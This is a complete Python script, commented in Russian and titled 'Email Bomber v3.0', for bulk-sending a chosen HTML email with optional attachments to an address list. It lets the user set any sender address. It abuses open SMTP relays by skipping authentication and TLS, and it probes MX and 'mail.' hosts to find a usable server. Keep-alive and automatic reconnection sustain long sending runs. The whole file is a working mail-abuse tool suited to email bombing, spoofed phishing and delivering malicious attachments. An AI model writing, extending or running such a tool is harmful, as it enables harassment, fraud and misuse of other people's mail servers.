#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Феня's Email Bomber v3.0
Теперь с поддержкой keep-alive!
"""

import smtplib
import time
import argparse
import sys
import re
import subprocess
import mimetypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path

# Явная регистрация типов для офисных файлов (на части систем mimetypes их не знает)
for ext, mime in [('.doc', 'application/msword'), ('.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'),
                  ('.xls', 'application/vnd.ms-excel'), ('.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'),
                  ('.pdf', 'application/pdf')]:
    mimetypes.add_type(mime, ext)


def _create_attachment(filepath):
    """Создаёт MIME-часть из файла. Поддерживает .doc, .pdf, .zip и любые бинарные файлы."""
    path = Path(filepath)
    if not path.exists():
        print(f"[!] Файл не найден: {filepath}")
        return None
    try:
        ctype, _ = mimetypes.guess_type(str(path)) or ('application/octet-stream', None)
        maintype, subtype = ctype.split('/', 1)
        with open(path, 'rb') as f:
            part = MIMEBase(maintype, subtype)
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename=path.name)
        return part
    except Exception as e:
        print(f"[!] Ошибка чтения вложения {filepath}: {e}")
        return None


def _parse_smtp_addr(server_str, port_override=None):
    """Парсит host:port из -s. Возвращает (host, port)."""
    if port_override is not None:
        port = port_override
        host = server_str.split(':')[0] if ':' in server_str else server_str
    elif ':' in server_str:
        parts = server_str.rsplit(':', 1)
        host = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            port = 587
    else:
        host = server_str
        port = 587
    return host, port


def _looks_like_ip(host):
    if host.startswith('['):
        return True
    if ':' in host and '.' not in host:
        return True  # IPv6 без скобок маловероятно, но пусть
    parts = host.split('.')
    if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
        return True
    return False


def _mx_hosts(domain):
    """Имена MX для домена (по приоритету). Пусто, если dig недоступен."""
    try:
        r = subprocess.run(
            ['dig', '+short', 'MX', domain],
            capture_output=True,
            text=True,
            timeout=8,
        )
        if r.returncode != 0 or not (r.stdout or '').strip():
            return []
        records = []
        for line in (r.stdout or '').splitlines():
            line = line.strip()
            if not line:
                continue
            m = re.match(r'(\d+)\s+(\S+)', line)
            if not m:
                continue
            records.append((int(m.group(1)), m.group(2).rstrip('.')))
        records.sort(key=lambda x: x[0])
        return [name for _, name in records]
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return []


def _smtp_host_candidates(host):
    """Куда пробовать SMTP: как указал пользователь, затем MX и mail.<домен>."""
    host = host.strip().rstrip('.')
    if _looks_like_ip(host):
        return [host]
    candidates = [host]
    for mx in _mx_hosts(host):
        if mx not in candidates:
            candidates.append(mx)
    if not host.startswith('mail.'):
        mail_guess = f'mail.{host}'
        if mail_guess not in candidates:
            candidates.append(mail_guess)
    return candidates


def _connect_refused(exc):
    if isinstance(exc, ConnectionRefusedError):
        return True
    if isinstance(exc, OSError) and getattr(exc, 'errno', None) in (111, 61):
        return True
    msg = str(exc).lower()
    return 'connection refused' in msg or 'errno 111' in msg


class EmailBomber:
    def __init__(self, smtp_server, smtp_user, smtp_password, mail_from, port=None, starttls_mode='auto'):
        self.smtp_server = smtp_server
        self.smtp_user = smtp_user or ''
        self.smtp_password = smtp_password or ''
        self.mail_from = mail_from
        self.port_override = port
        # starttls_mode: 'auto' | 'on' | 'off'
        self.starttls_mode = starttls_mode
        self.smtp_connection = None
        self.connected_host = None

    def _apply_starttls(self, port):
        """STARTTLS по режиму. Порт 25 по умолчанию plain (как swaks без --tls) — многие open-relay мисконфиги ломаются после апгрейда."""
        mode = self.starttls_mode
        if mode == 'off':
            print("[~] STARTTLS отключён (--no-starttls / open-relay режим)")
            return
        if mode == 'on':
            self.smtp_connection.starttls()
            print("[+] STARTTLS применён (--starttls)")
            return
        # auto: 587 — с STARTTLS; 25 и прочие — plain без апгрейда
        if port == 587:
            self.smtp_connection.starttls()
            print("[+] STARTTLS применён (порт 587, auto)")
        else:
            print("[~] Plain SMTP без STARTTLS (порт {}, как swaks на :25)".format(port))
        
    def _open_smtp(self, host, port):
        if port == 465:
            self.smtp_connection = smtplib.SMTP_SSL(host, port, timeout=30)
            print("[+] SSL-соединение установлено (порт 465)")
        else:
            self.smtp_connection = smtplib.SMTP(host, port, timeout=30)
            self._apply_starttls(port)

    def connect(self):
        """Коннектимся к SMTP. Порт 465 (SSL), 587 (STARTTLS), 25 (plain open-relay по умолчанию)."""
        host, port = _parse_smtp_addr(self.smtp_server, self.port_override)
        candidates = _smtp_host_candidates(host)
        if len(candidates) > 1:
            print(f"[~] Варианты SMTP-хоста: {', '.join(candidates)}")

        last_error = None
        for idx, try_host in enumerate(candidates):
            if idx:
                print(f"[~] {candidates[idx - 1]}:{port} — {last_error}, пробуем {try_host}...")
            print(f"[+] Подключаемся к {try_host}:{port}...")
            try:
                self._open_smtp(try_host, port)
                if self.smtp_user and self.smtp_password:
                    self.smtp_connection.login(self.smtp_user, self.smtp_password)
                    print("[+] Аутентификация выполнена")
                else:
                    print("[~] Без аутентификации (relay/open server)")

                self.connected_host = try_host
                if try_host != host:
                    print(f"[+] Используем SMTP-хост {try_host} (в -s был {host})")
                print("[+] SMTP подключение установлено! Готовы к бомбардировке 💣")
                return True
            except Exception as e:
                last_error = e
                self.smtp_connection = None
                if _connect_refused(e) and idx < len(candidates) - 1:
                    continue
                print(f"[!] Ошибка подключения к SMTP: {e}")
                if len(candidates) > 1:
                    print("[!] На apex-домене часто нет порта 25 — проверь: dig +short MX <домен>")
                return False
        return False

    def reconnect(self):
        print("[~] Переподключаемся к SMTP серверу...")
        self.disconnect()
        time.sleep(5)
        return self.connect()
            
    def disconnect(self):
        """Отключаемся как джентльмены"""
        if self.smtp_connection:
            try:
                time.sleep(2)
                self.smtp_connection.quit()
                print("[+] SMTP соединение закрыто")
            except Exception as e:
                print(f"[!] Ошибка при закрытии соединения: {e}")
    
    def smart_delay(self, seconds):
        """Умная задержка с keep-alive"""
        print(f"[~] Ждем {seconds} секунд... (поддерживаем соединение живым)")
        
        # Если задержка больше 5 секунд - делаем keep-alive каждые 5 сек
        if seconds > 5:
            intervals = seconds // 5
            remainder = seconds % 5
            
            for i in range(intervals):
                time.sleep(5)
                try:
                    # Отправляем NOOP для поддержания соединения
                    self.smtp_connection.noop()
                    print(f"[~] Keep-alive ping #{i+1}")
                except:
                    print("[!] Keep-alive не удался, но продолжаем...")
            
            if remainder > 0:
                time.sleep(remainder)
        else:
            time.sleep(seconds)
            
    def send_email(self, to_email, html_template, subject="Important Message", attachments=None): 
        """Отправляем одно письмо. attachments — список путей к файлам (.doc, .pdf и т.д.)"""
        try:
            msg = MIMEMultipart('mixed')
            msg['From'] = self.mail_from
            msg['To'] = to_email
            msg['Subject'] = subject
            
            # Прикрепляем HTML
            html_part = MIMEText(html_template, 'html', 'utf-8')
            msg.attach(html_part)
            
            # Вложения
            if attachments:
                for filepath in attachments:
                    part = _create_attachment(filepath)
                    if part:
                        msg.attach(part)
            
            # Пытаемся отправить
            self.smtp_connection.sendmail(self.mail_from, to_email, msg.as_string())
            print(f"[+] Письмо отправлено на {to_email} ✅")
            return True
            
        except smtplib.SMTPServerDisconnected:
            print(f"[!] Соединение прервано, переподключение к SMTP перед повторной отправкой на {to_email}")
            if self.reconnect():
                return self.send_email(to_email, html_template, subject, attachments)
            return False
        except smtplib.SMTPException as e:
            print(f"[!] Ошибка SMTP при отправке на {to_email}: {e}")
            return False

def load_emails_from_file(file_path):
    """Загружаем email'ы из файла."""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            emails = [line.strip() for line in f if line.strip() and '@' in line]
        print(f"[+] Загружено {len(emails)} email адресов")
        return emails
    except Exception as e:
        print(f"[!] Ошибка загрузки файла с email'ами: {e}")
        return []

def load_html_template(template_path):
    """Загружаем HTML шаблон."""
    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            template = f.read()
        print(f"[+] HTML шаблон загружен ({len(template)} символов)")
        return template
    except Exception as e:
        print(f"[!] Ошибка загрузки HTML шаблона: {e}")
        return None

def main():
    print("""
    ╔══════════════════════════════════════╗
    ║     Феня's Email Bomber v3.0         ║
    ║   "Keep-alive like a hacker boss!"   ║
    ╚══════════════════════════════════════╝
    """)
    
    parser = argparse.ArgumentParser(description="Массовая рассылка писем с keep-alive")
    parser.add_argument('-e', '--emails', required=True, help="Файл с email адресами")
    parser.add_argument('-d', '--delay', type=int, required=True, help="Задержка между отправками (секунды)")
    parser.add_argument('-s', '--smtp-server', required=True, help="SMTP сервер (host или host:port, напр. exchange.local:465)")
    parser.add_argument('--port', type=int, default=None, help="Порт SMTP (если не указан в -s). 465=SSL, 587=STARTTLS, 25=plain")
    tls_group = parser.add_mutually_exclusive_group()
    tls_group.add_argument('--starttls', action='store_true', help="Принудительно STARTTLS (на :25 если сервер требует TLS)")
    tls_group.add_argument('--no-starttls', action='store_true',
                           help="Без STARTTLS: open-relay на :25 как swaks без --tls (минуя AUTH/TLS)")
    parser.add_argument('-u', '--user', default='', help="SMTP логин (опусти для relay без auth)")
    parser.add_argument('-p', '--password', default='', help="SMTP пароль")
    parser.add_argument('-f', '--mail-from', required=True, help="Email отправителя")
    parser.add_argument('-t', '--template', required=True, help="HTML файл с шаблоном письма")
    parser.add_argument('--subject', default="Important Message", help="Тема письма")
    parser.add_argument('-a', '--attach', action='append', dest='attachments', default=[],
                        help="Файл для вложения (.doc, .pdf, .zip и т.д.). Можно указать несколько раз: -a file.doc -a doc2.pdf")
    
    args = parser.parse_args()
    
    # Проверяем файлы
    if not Path(args.emails).exists():
        print(f"[!] Файл с email'ами не найден: {args.emails}")
        sys.exit(1)
        
    if not Path(args.template).exists():
        print(f"[!] HTML шаблон не найден: {args.template}")
        sys.exit(1)
    
    for att in args.attachments:
        if not Path(att).exists():
            print(f"[!] Файл вложения не найден: {att}")
            sys.exit(1)
    if args.attachments:
        print(f"[+] Вложений: {len(args.attachments)} — {', '.join(Path(a).name for a in args.attachments)}")
    
    # Загружаем данные
    emails = load_emails_from_file(args.emails)
    if not emails:
        print("[!] Не удалось загрузить email адреса")
        sys.exit(1)
        
    html_template = load_html_template(args.template)
    if not html_template:
        print("[!] Не удалось загрузить HTML шаблон")
        sys.exit(1)
    
    if args.starttls:
        starttls_mode = 'on'
    elif args.no_starttls:
        starttls_mode = 'off'
    else:
        starttls_mode = 'auto'

    bomber = EmailBomber(
        args.smtp_server, args.user, args.password, args.mail_from, args.port,
        starttls_mode=starttls_mode,
    )
    
    if not bomber.connect():
        sys.exit(1)
    
    print(f"\n[+] Начинаем рассылку на {len(emails)} адресов с задержкой {args.delay} сек")
    print("[+] Как говорил мой дед: 'Keep-alive - это как дыхание: забудешь и сдохнешь!'\n")
    
    # Основной цикл рассылки
    sent_count = 0
    failed_count = 0
    
    try:
        for i, email in enumerate(emails, 1):
            print(f"[{i}/{len(emails)}] Отправляем на {email}...")
            
            if bomber.send_email(email, html_template, args.subject, args.attachments or None):
                sent_count += 1
            else:
                failed_count += 1
            
            # Умная задержка с keep-alive (кроме последнего письма)
            if i < len(emails):
                bomber.smart_delay(args.delay)
                
    except KeyboardInterrupt:
        print("\n[!] Рассылка прервана пользователем (Ctrl+C)")
    except Exception as e:
        print(f"\n[!] Критическая ошибка: {e}")
    finally:
        bomber.disconnect()
        
    print(f"""
    ╔═══════════════════════════════════════╗
    ║           ИТОГИ РАССЫЛКИ              ║
    ║  Отправлено успешно: {sent_count:<15} ║
    ║  Ошибок отправки: {failed_count:<18}  ║
    ║  "Keep-alive for the win, чувак!"     ║
    ╚═══════════════════════════════════════╝
    """)

if __name__ == "__main__":
    main()
